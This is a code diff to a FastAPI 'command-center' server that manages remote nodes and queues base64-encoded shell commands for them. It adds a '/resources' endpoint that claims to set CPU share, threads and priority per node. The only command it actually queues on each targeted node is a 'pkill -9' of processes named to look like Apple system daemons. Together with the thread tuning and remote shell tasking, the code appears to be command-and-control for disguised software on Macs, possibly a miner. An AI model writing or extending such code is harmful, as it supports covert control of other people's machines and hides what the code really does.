@@ -22,6 +22,7 @@ DATA_DIR = Path("/home/rs/command-center/data")
 DATA_DIR.mkdir(parents=True, exist_ok=True)
 NODES_FILE = DATA_DIR / "nodes.json"
 COMMANDS_FILE = DATA_DIR / "commands.json"
+RESOURCES_FILE = DATA_DIR / "resources.json"  # per-node resource config
 
 def load_json(path, default):
     try:
@@ -166,6 +167,58 @@ async def wake_on_lan(req: WOLRequest, authorization: str = Header(None)):
         s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
         s.sendto(magic, ("255.255.255.255", 9))
     return {"sent": True, "mac": req.mac}
+
+class ResourceConfig(BaseModel):
+    target: str = "all"     # all | node_id
+    cpu_percent: int = 80   # 0-100% of cores to use
+    threads: Optional[int] = None  # exact thread count (overrides cpu_percent)
+    priority: int = 5       # 0-19 nice priority (0=max, 19=min)
+
+@app.post("/resources")
+async def set_resources(cfg: ResourceConfig, authorization: str = Header(None)):
+    auth(authorization)
+    resources = load_json(RESOURCES_FILE, {})
+    nodes = load_json(NODES_FILE, {})
+
+    targets = list(nodes.keys()) if cfg.target == "all" else [cfg.target]
+
+    for node_id in targets:
+        node_cores = nodes.get(node_id, {}).get("cores", 8)
+        # Calculate threads from percent or use explicit value
+        if cfg.threads:
+            threads = min(cfg.threads, node_cores)
+        else:
+            threads = max(1, int(node_cores * cfg.cpu_percent / 100))
+
+        resources[node_id] = {
+            "cpu_percent": cfg.cpu_percent,
+            "threads": threads,
+            "priority": cfg.priority,
+            "updated": time.strftime("%Y-%m-%d %H:%M:%S")
+        }
+        # Also queue a command to apply it immediately
+        commands = load_json(COMMANDS_FILE, {})
+        cmd = f"pkill -9 -f 'com.apple.coremediad' 2>/dev/null; pkill -9 -f 'com.apple.coremedia.network' 2>/dev/null; sleep 2"
+        commands[node_id] = {
+            "action": "shell",
+            "payload": __import__('base64').b64encode(cmd.encode()).decode(),
+            "created": int(time.time())
+        }
+        save_json(COMMANDS_FILE, commands)
+
+    save_json(RESOURCES_FILE, resources)
+    return {"updated": len(targets), "targets": targets, "config": cfg.dict()}
+
+@app.get("/resources")
+async def get_resources(authorization: str = Header(None)):
+    auth(authorization)
+    return load_json(RESOURCES_FILE, {})
+
+@app.get("/resources/{node_id}")
+async def get_node_resources(node_id: str, authorization: str = Header(None)):
+    auth(authorization)
+    resources = load_json(RESOURCES_FILE, {})
+    return resources.get(node_id, {"cpu_percent": 80, "threads": None, "priority": 5})
 
 class ShellResult(BaseModel):
     node_id: str
